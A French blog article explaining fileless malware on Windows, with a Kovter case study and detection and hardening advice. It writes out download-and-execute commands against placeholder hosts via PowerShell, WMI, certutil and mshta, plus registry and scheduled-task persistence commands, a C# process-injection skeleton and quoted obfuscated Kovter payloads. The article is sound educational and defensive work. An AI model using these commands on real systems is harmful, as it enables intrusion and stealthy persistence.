---
title: "malware : comprendre et mitiger les attaques"
date: 2019-03-10
description: "A brief description of Hugo Shortcodes"
summary: "This is an _example_ of a **rich** content summary."
tags: ["shortcodes", "privacy", "sample", "gist", "twitter", "youtube", "vimeo"]
---

1. Introduction

Même si nous sommes dans un paysage numérique en pleine évolution et si les cybermenaces ne cessent de croître, les menaces de type « fileless malware » (malware sans fichier) ne sont pas nouvelles. Ces menaces se distinguent par leur capacité à échapper aux méthodes de détection traditionnelles. Contrairement aux malwares classiques qui s'appuient sur des fichiers exécutables pour infecter un système (en se multipliant par exemple), les malwares sans fichier n'utilisent aucun fichier pour mener à bien leurs attaques. Ceci rend leur présence pratiquement invisible aux logiciels de sécurité standards (e.g., antivirus).

La particularité des malwares sans fichier est qu’ils s'exécutent directement en mémoire pour détourner des outils légitimes du système qui scannent les fichiers. Cette approche leur permet de contourner les mécanismes de sécurité traditionnels et de persister, ou pas, sur les systèmes compromis sans laisser de trace durable sur les disques. Comprendre ces malwares est donc nécessaire pour toute organisation soucieuse de protéger ses actifs numériques. Cet article se propose d'explorer en profondeur ce type de menace, en détaillant les techniques d'infection, les méthodes de détection et les stratégies de prévention et de remédiation. À travers des exemples concrets et des études de cas, nous mettrons en lumière les moyens de contrer ces attaques invisibles.

2.1 Définition et caractéristiques

Un fileless malware est un type de logiciel malveillant qui n'écrit aucun fichier sur le disque dur du système infecté. Au lieu de cela, il réside principalement en mémoire vive et exploite des outils et des processus légitimes de l’OS pour exécuter des activités malveillantes. Cette technique rend les fileless malwares particulièrement difficiles à détecter et à analyser, car ils ne laissent pas de traces tangibles sur le disque qui pourraient être repérées par les techniques de sécurité traditionnelles basées sur la signature ou le scan de fichiers. Ils exploitent des outils et des scripts intégrés à l’OS, comme PowerShell, WMI, et les commandes de Windows si on se focalise sur les systèmes Microsoft. Ils sont aussi capables d’utiliser des méthodes un peu plus sophistiquées pour maintenir leur présence en mémoire même après un redémarrage (nous verrons cela dans la suite de l’article), souvent en modifiant des clés de registre ou en programmant des tâches planifiées. C’est pourquoi il est plus compliqué de les détecter.

2.2 Avantages pour les attaquants

Les fileless malwares offrent plusieurs avantages pour les cybercriminels et les attaquants. Sans avoir peur de la redondance : en n'écrivant pas de fichiers sur le disque dur, les fileless malwares échappent aux solutions de sécurité basées sur la signature et aux scans de fichiers, ce qui rend leur détection beaucoup plus complexe. En utilisant des outils intégrés au système comme PowerShell et WMI, ils peuvent masquer leurs activités malveillantes parmi les opérations légitimes du système. Leurs techniques de persistance leur permettent de survivre aux redémarrages et aux nettoyages de système : on comprend vite qu’il devient difficile de les éradiquer efficacement. De plus, leur exécution rapide en mémoire leur permet d’exécuter leurs processus malveillants avant même que des mesures de sécurité puissent être mises en place. En un mot, ils sont redoutables !

3. Infection et persistance

Les fileless malwares utilisent plusieurs techniques pour infecter un système et pour rester persistants sur ce même système, sans laisser de traces sur le disque dur. Nous allons voir, dans cette section, les méthodes utilisées, comme l'exploitation de scripts, l'utilisation de la mémoire vive et l'abus des outils d’administration du système. À noter que l’article se focalise sur les systèmes Windows, car ce sont les systèmes les plus attaqués par les acteurs malveillants du fait qu’ils sont beaucoup plus utilisés, et par les particuliers, et par les entreprises.

Exploitation de scripts légitimes

Les fileless malwares exploitent des scripts et des outils intégrés au système d'exploitation pour exécuter des activités malveillantes sans laisser de traces sur le disque dur. PowerShell est très utilisé par les attaquants pour télécharger et exécuter des scripts malveillants directement en mémoire. Par exemple, un script PowerShell malveillant peut être utilisé ainsi :
# on télécharge et on exécute le code malveillant en mémoire
$script = Invoke-WebRequest -Uri "http://exemple.com/script-malveillant.ps1" -UseBasicParsing
Invoke-Expression $script.Content

Ce script PowerShell télécharge un autre script malveillant depuis un serveur distant et l'exécute directement en mémoire, sans jamais l'écrire sur le disque. Le code malveillant n’étant pas dans le premier script, rien n’est détecté.

De plus, Windows Management Instrumentation (le fameux WMI) est une autre interface de gestion qui permet l'exécution de commandes à distance et l'interaction avec les composants internes de Windows. Les fileless malwares l’utilise évidemment pour exécuter encore une fois du code malveillant en totale transparence pour les utilisateurs ET les outils de scan :
# ici, un processus malveillant est généré via WMI
(Get-WmiObject -Query "SELECT * FROM Win32_Process WHERE Name='explorer.exe'").Create("powershell -NoProfile -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://exemple.com/script-malveillant.ps1')")

Ces méthodes permettent aux attaquants de dissimuler leurs activités parmi les opérations légitimes du système et d'éviter les mécanismes de sécurité traditionnels [FIMA].

Utilisation de la mémoire pour l’exécution de code

Les fileless malwares s'exécutent principalement, nous le savons maintenant, en mémoire vive, ils évitent ainsi d’écrire du code malveillant sur le disque dur. Une fois en mémoire, ces malwares peuvent injecter du code malveillant directement dans des processus légitimes (comme un navigateur, ou une calculatrice) en cours d'exécution, comme explorer.exe ou svchost.exe. Voici un exemple de code en C# pour illustrer comment un attaquant peut injecter un shellcode directement en mémoire d'un processus cible :
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
 
class Program
{
          [DllImport("kernel32.dll")]
          public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
          [DllImport("kernel32.dll")]
          public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
          [DllImport("kernel32.dll")]
          public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
          [DllImport("kernel32.dll")]
          public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);
 
    static void Main()
    {
        byte[] shellcode = new byte[] { /* code du shellcode */ };
        Process processus = Process.GetProcessesByName("explorer")[0];
        IntPtr hProcess = OpenProcess(0x001F0FFF, false, processus.Id);
        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, 0x1000 | 0x2000, 0x40);
        WriteProcessMemory(hProcess, addr, shellcode, (uint)shellcode.Length, out _);
        CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, out _);
    }
}

Ce bout de code montre comment un attaquant peut ouvrir un processus cible, allouer de la mémoire dans ce processus, écrire du shellcode dans cette mémoire et créer un thread à distance pour exécuter le shellcode.

Abus des outils d’administration du système

Les fileless malwares exploitent aussi très souvent les outils d'administration système pour mener leurs attaques, une technique connue sous le nom de Living off the Land. Ces outils, appelés Living off the Land Binaries and Scripts (LOLBAS), incluent des exécutables et scripts légitimes déjà présents sur le système d'exploitation. On peut citer certutil.exe, mshta.exe, et wscript.exe. En abusant de ces outils, les attaquants peuvent télécharger, exécuter et masquer leurs activités malveillantes : tout ce qu’il faut pour une attaque sans écrire sur le disque.

Par exemple, certutil.exe, un outil de gestion de certificats fourni avec Windows, peut être détourné pour télécharger des fichiers depuis Internet :
certutil.exe -urlcache -split -f http://exemple.com/script_malveillant.ps1 C:\Windows\Temp\script_malveillant.ps1
powershell.exe -ExecutionPolicy Bypass -File C:\Windows\Temp\script_malveillant.ps1

La première commande, télécharge un script PowerShell et l'enregistre dans le dossier temporaire de Windows. La deuxième commande, exécute le script téléchargé avec PowerShell en contournant les politiques d'exécution qui pourraient empêcher l'exécution de scripts non signés.

Un autre exemple est l'abus de mshta.exe, un interpréteur d'applications HTML, qui peut être utilisé pour exécuter des scripts malveillants directement depuis le Web :
mshta.exe "javascript:eval('var x=new ActiveXObject(\"WScript.Shell\"); x.Run(\"powershell.exe -ExecutionPolicy Bypass -File http://exemple.com/script-malveillant.ps1\");close();')"

Cette commande exécute du code JavaScript. Ce dernier crée un objet WScript.Shell, qui lance ensuite une commande PowerShell pour télécharger et exécuter un script malveillant.

En utilisant ces techniques, les fileless malwares peuvent infiltrer et persister dans les systèmes de manière furtive, échappant aux solutions de sécurité traditionnelles basées sur l'analyse des fichiers.
3.1 Techniques de persistance après redémarrage ou nettoyage

Pour rendre un fileless malware persistant après un redémarrage ou un nettoyage du système, les attaquants utilisent plusieurs techniques, voyons en 2 :

Modifications du registre Windows

Les fileless malwares peuvent devenir persistants en modifiant des clés de registre dans Windows. Par exemple, un attaquant peut ajouter une entrée dans la clé Run ou RunOnce pour exécuter un script malveillant à chaque démarrage de l'ordinateur. Voici un exemple de commande PowerShell qui ajoute une entrée de persistance dans le registre :
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "scriptMalveillant" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\chemin\vers\script.ps1"

Cette commande configure le script pour qu'il soit exécuté à chaque démarrage de l'utilisateur courant pour télécharger et charger le script malveillant directement en mémoire.

Utilisation des tâches planifiées

Ils peuvent également utiliser le planificateur de tâches de Windows pour configurer des tâches récurrentes qui exécutent du code à des intervalles spécifiés ou lors de certains événements, comme le démarrage du système. Voici un exemple de commande pour créer une tâche planifiée :
schtasks /create /tn "Tache" /tr "powershell.exe -ExecutionPolicy Bypass -File C:\chemin\vers\script.ps1" /sc onlogon /ru SYSTEM

Cette commande crée une tâche planifiée qui exécute le script chaque fois qu'un utilisateur se connecte au système.
4. Étude de cas : Kovter

Kovter est un très bon exemple de fileless malware, presque un cas d’école. Comme beaucoup de malwares, il a été conçu pour générer de l’argent, ici via des activités de fraude publicitaire. Initialement, un malware normal, ses développeurs l’on fait évoluer pour qu’il soit capable d'exécuter des payloads malveillantes en mémoire directement. Kovter persiste sur les systèmes infectés en modifiant les clés de registre Windows (voir section précédente). Il utilise également des techniques d'obfuscation avancées.

Prenons un peu de hauteur et essayons de comprendre ensemble comment Kovter mène ses attaques.
4.1 Description de l’attaque

L’attaque de Kovter commence souvent par une campagne de phishing, où des e-mails contenant des liens malveillants ou des documents infectés sont envoyés aux victimes. Une fois le lien cliqué ou le document ouvert, un script JavaScript est exécuté, qui lui-même télécharge et exécute un script PowerShell directement en mémoire.
4.2 Schéma de l’infection

    Phishing : La victime reçoit un e-mail contenant un lien ou un document malveillant.
    Exécution du script : En cliquant sur le lien ou en ouvrant le document, un script JavaScript est exécuté.
    Téléchargement du script PowerShell : Le script JavaScript télécharge et exécute un script PowerShell en mémoire.
    Persistant dans le registre : Kovter modifie les clés de registre pour persister après les redémarrages.
    Exécution des payloads : Le script PowerShell télécharge et exécute les payloads malveillantes nécessaires pour réaliser les objectifs de l’attaquant, comme la fraude publicitaire ou le vol de données.

4.3 Analyse technique détaillée

Voyons comment Kovter fonctionne plus en détail.

Infection et exécution initiale

Une fois exécuté, le malware procède à une série d'actions, y compris l'exécution de mshta.exe via WMI, qui utilise PowerShell pour lancer regsvr32.exe avec la payload injectée :
var x = new ActiveXObject("WScript.Shell");
x.Run("powershell.exe -ExecutionPolicy Bypass -File http://une-url.com/script_malveillant.ps1");
close();

Une fois le script PowerShell exécuté, il télécharge et exécute le code malveillant en mémoire :
IEX (New-Object Net.WebClient).DownloadString('http://une-url.com/script_malveillant.ps1')

Pour persister, Kovter crée des clés de registre contenant du code malveillant obfusqué :
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "KovterPersistence" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Path\To\Kovter.ps1"

Ces clés de registre sont créées sous HKLM\Software et sont souvent obfusquées pour échapper à la détection, contenant des caractères non-ASCII dans les noms de sous-clés pour compliquer l'analyse.

Trois exemples de clés écrites par Kovler :

Première clé

    Nom du processus : regsvr32.exe
    Chemin : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\
    Contenu : Type: REG_SZ, Length: 396, Data: mshta javascript:mYBFJx81=VPu*;J1A4=new
    %20ActiveXObject("WScript.Shell");caxOBn9R="TxkSMgF".EX9Uf=J1A4.RegRead("HKLM\
    software\de862dbe5a1/5d918ae1");jJYT2cqQ="6Qsu3H";eval(EX9Uf);Wz2xx1koPm="NY";-:

Deuxième clé

    Nom du processus : regsvr32.exe
    Chemin : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\
    Contenu : Type: REG_SZ, Length: 400, Data: mshta javascript:LnE1uVal="72fI";k1l=new
    %20ActiveXObject("WScript.Shell");W7t8gKkj="UIMyt";mPj8T=k1l.RegRead("HKLM\
    software\de862dbe5a1/5d918ae1");mDg2tIcIF="TNXEut";eval(mPj8T);tNELSvv9x="Rg9qoc";*:

Troisième clé

    Nom du processus : regsvr32.exe
    Chemin : HKCU\Software\Microsoft\Windows\CurrentVersion\Run\
    Contenu : Type: REG_SZ, Length: 410, Data: mshta javascript:q7G5LaqhL=wACEUxNMK*;r8b=new
    %20ActiveXObject("WScript.Shell");HbhN88s=gRbhYQS7*;AxuV8=r8b.RegRead("HKCU\
    software\de862dbe5a1/5d918ae1");dDOS8kt="fUBBySRb1";eval(gRbhYQS7);MtTQ6JTif="IN";C

Les entrées sont clairement obfusquées, si on les déobfusque, on obtient :

Clé 1 :
var J1A4 = new ActiveXObject("WScript.Shell");
var EX9Uf = J1A4.RegRead("HKLM\\software\\de862dbe5a1\\5d918ae1");
eval(EX9Uf);

Clé 2 :
var k1l = new ActiveXObject("WScript.Shell");
var mPj8T = k1l.RegRead("HKLM\\software\\de862dbe5a1\\5d918ae1");
eval(mPj8T);

Clé 3 :
var r8b = new ActiveXObject("WScript.Shell");
var AxuV8 = r8b.RegRead("HKCU\\software\\de862dbe5a1\\5d918ae1");
eval(AxuV8);

Ces bouts de code JavaScript utilisent ActiveXObject pour créer un objet WScript.Shell, qui permet d'interagir avec l’OS. Il lit ensuite une valeur spécifique dans le registre qui se trouve à HKCU\software\de862dbe5a1\5d918ae1, stockée sous forme de chaîne de caractères. La fonction eval exécute ensuite dynamiquement cette chaîne, permettant ainsi l'exécution de code malveillant contenu dans cette entrée de registre.

Ces entrées montrent comment Kovter utilise des clés de registre obfusquées pour stocker et exécuter du code JavaScript malveillant via mshta.exe. Le code JavaScript récupère ensuite des valeurs du registre, les déchiffre et les exécute, ce qui permet d’assurer la persistance du malware sur le système.

Obfuscation et évasion

Kovter utilise aussi d’autres techniques d'obfuscation pour masquer ses activités. Les scripts PowerShell sont encodés en base64 :
$encodedCommand = "cG93ZXJzaGVsbCAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtQ29tbWFuZCAiJGVuY29kZWRTY3JpcHQi"
powershell.exe -EncodedCommand $encodedCommand

Le code malveillant stocké dans le registre peut également contenir des scripts JavaScript encodés et chiffrés, qui sont ensuite déchiffrés et exécutés dynamiquement :
EncipheredPayload = "7F62342526……15244427C";
Key = "egNgbSpZ……xf1VAoqQA";
DecipheredPayload = "";
 
IntermediatePayload = "";
for (i = 0; i < EncipheredPayload.length; i += 2) IntermediatePayload += String.fromCharCode(parseInt(EncipheredPayload.substr(i, 2), 16));
 
for (i = j = 0; j < IntermediatePayload.length; j++) {
    DecipheredPayload += String.fromCharCode(IntermediatePayload.substr(j, 1).charCodeAt() ^ Key.substr(i, 1).charCodeAt());
    i = (i < Key.length - 1) ? i + 1 : 0;
}
 
eval(DecipheredPayload);

Kovter illustre bien l'ingéniosité des fileless malwares. En exploitant PowerShell et mshta.exe pour exécuter du code en mémoire, il contourne les mécanismes de détection traditionnels. La persistance est assurée par des clés de registre obfusquées contenant des scripts JavaScript malveillants, qui lisent et exécutent des payloads depuis le registre. Face à ces menaces, il est nécessaire pour les organisations de renforcer leurs mesures de sécurité et de rester vigilantes face aux nouvelles méthodes d'attaque : voyons cela dans la section suivante.
5. Détection et analyse

Cette section détaille quelques-unes des techniques qu’il est possible de déployer pour combattre efficacement les fileless malwares.
5.1 Techniques de détection
5.1.1 Détection comportementale

La détection comportementale repose sur l'observation des comportements suspects dans le système, tels que l'exécution anormale de scripts, l'utilisation de trop de ressources système ou des modifications bizarres des configurations de sécurité. Les systèmes de détection comportementale surveillent les activités en temps réel et déclenchent des alertes lorsqu'un comportement déviant de la normalité est détecté. Cette méthode, très utilisée dans la détection de transactions frauduleuses, de bombes logiques, ou encore de trames réseaux potentiellement malveillantes s’appuie sur une technique d’apprentissage automatique bien connue : la détection d’anomalies.

Contre les fileless malwares, l’idée est de savoir comment le système se comporte habituellement pour pouvoir déduire des variances qui pourraient indiquer un potentiel comportement malveillant.
5.1.2 Détection heuristique

Ah les heuristiques ! Pas systématiques, mais très efficaces, notamment contre les menaces connues. En effet, la détection heuristique utilise des algorithmes (boostés par des intuitions humaines comme : est-ce que cette clé de registre existe ?) pour analyser le code et le comportement des programmes à la recherche de caractéristiques communes aux malwares. Cette technique permet d'identifier des malwares connus ou modifiés en détectant des motifs (connus) suspects dans la mémoire, les registres, les processus, etc. Les systèmes heuristiques peuvent aussi analyser les scripts PowerShell et les commandes WMI pour identifier des activités potentiellement malveillantes : comme le téléchargement de scripts sur des serveurs distants pour les exécuter à la volée.
5.2 Outils de détection spécifiques
5.2.1 Sysmon

Sysmon (pour System Monitor) est un outil de Microsoft qui permet de surveiller en profondeur les évènements du système. Il en registre tout sur les processus : informations sur leur création, les connexions réseau et les modifications de fichiers, etc. Cela permet aux analystes ensuite de détecter des comportements potentiellement suspects. Encore mieux, à l’ère de l’IA ces informations peuvent être utilisées comme des features pour entraîner des modèles de détection plus efficaces.
5.2.2 Autoruns

Autoruns est un autre outil de Microsoft qui permet de visualiser et de gérer les programmes qui se lancent automatiquement au démarrage de Windows. Il peut aider rapidement à identifier les modifications de registre utilisées par les fileless malwares pour persister sur le système. En surveillant les points de démarrage automatique, Autoruns aide à détecter et supprimer les entrées suspectes.
5.3 Étude d’une détection réussie

Pour illustrer une détection réussie, considérons un cas où Sysmon est utilisé pour détecter une activité suspecte liée à un fileless malware.

Configuration de Sysmon : la première étape consiste à installer et configurer Sysmon pour surveiller les événements potentiellement critiques. Un fichier de configuration XML est utilisé pour définir les règles de surveillance :
<Sysmon schemaversion="4.22">
  <EventFiltering>
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains">powershell.exe</CommandLine>
    </ProcessCreate>
  </EventFiltering>
</Sysmon>

Surveillance des événements : Sysmon enregistre les événements liés à l'exécution de PowerShell dans les logs Windows. Les analystes peuvent utiliser l'Event Viewer ou bien le SIEM de leur choix pour examiner ces logs.

Analyse des logs : les logs Sysmon fournissent des détails sur les processus créés, y compris les arguments de ligne de commandes utilisés. Ainsi, les analystes peuvent rechercher des commandes PowerShell suspectes, comme celles qui utilisent -ExecutionPolicy Bypass.

Un exemple de log Sysmon pour un processus PowerShell :
Process Create:
RuleName: -
UtcTime: 2023-01-01 12:00:00.000
ProcessGuid: {D43F5A22-1E5F-5D12-0000-001052ED2D00}
ProcessId: 1234
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
CommandLine: powershell.exe -ExecutionPolicy Bypass -File C:\Temp\script.ps1
CurrentDirectory: C:\Windows\System32\
User: DOMAIN\User

La détection des fileless malwares nécessite une approche bien évidemment multifacette combinant la surveillance comportementale, heuristique et l'utilisation d'outils spécifiques, voire même de programmes faits maison. En mettant en œuvre ces techniques et en utilisant des scripts d'analyse automatisés, les organisations peuvent améliorer leur capacité à détecter et à réagir aux menaces posées par les fileless malwares.
6. Prévention et protection

Voyons ensemble quelques stratégies pour se protéger proactivement efficacement contre les fileless malwares.
6.1 Meilleures pratiques de sécurité

Comme d’habitude en sécurité, il existe des bonnes pratiques à suivre pour réduire les risques :

    Restriction des privilèges : limiter les privilèges utilisateur réduit les risques d'exécution de code malveillant. Les utilisateurs ne devraient disposer que des droits nécessaires pour accomplir leurs tâches.
    Mises à jour régulières : maintenir à jour les OS, les applications et les logiciels de sécurité est primordial pour combler les vulnérabilités exploitées par les malwares.
    Formation des utilisateurs : sensibiliser les employés aux techniques de phishing et aux meilleures pratiques de sécurité aide à prévenir les infections.

6.2 Configuration et durcissement des systèmes

Le hardening est bien connu des experts en sécurité, pour les fileless malwares, voici quelques conseils :

    Group Policies : utiliser les stratégies de groupe pour restreindre l'exécution de scripts et de macros non autorisés. Par exemple, désactiver l'exécution de PowerShell non signé et limiter l'utilisation de mshta.exe.
    AppLocker : configurer AppLocker pour contrôler quelles applications et scripts peuvent s'exécuter sur le système. Cela permet de bloquer l'exécution de logiciels non autorisés, même les scripts malveillants.
    Configuration de PowerShell : utiliser les politiques d'exécution de PowerShell pour restreindre l'exécution de scripts non signés et activer la journalisation pour surveiller les activités suspectes.

Conclusion

En conclusion, les fileless malwares représentent toujours une menace pour les systèmes informatiques. Ils exploitent des vulnérabilités (pas au sens de « failles ») des outils légitimes et déjà présents sur les systèmes cibles pour exécuter du code malveillant directement en mémoire. Ils contournent ainsi les méthodes de détection traditionnelles. Cependant, comme toute menace, il est possible de les mitiger et de les prévenir avec de bonnes pratiques de sécurité.

Il est très important, surtout pour une organisation, de rester vigilant et de se tenir informé des nouvelles menaces. Les cybercriminels évoluent constamment, et les techniques de protection doivent suivre ce rythme pour rester efficaces. En adoptant une approche proactive, comme la formation continue des utilisateurs et l'intégration de solutions de sécurité, les organisations peuvent mieux se protéger contre les fileless malwares et autres menaces évidemment. Investir dans la cybersécurité n'est pas seulement une nécessité technique, mais aussi une stratégie essentielle pour la résilience et la protection des données.

N’oublions pas de mentionner l’intelligence artificielle qui prend de plus en plus de place, même en cybersécurité. Elle jouera un rôle de plus en plus important dans l’avenir de la cybersécurité. Grâce à ses capacités d’analyse comportementale automatiques et bien meilleures que les humains, l’IA peut identifier des anomalies et des comportements suspects en temps réel, offrant une réponse plus rapide et plus efficace aux menaces émergentes.
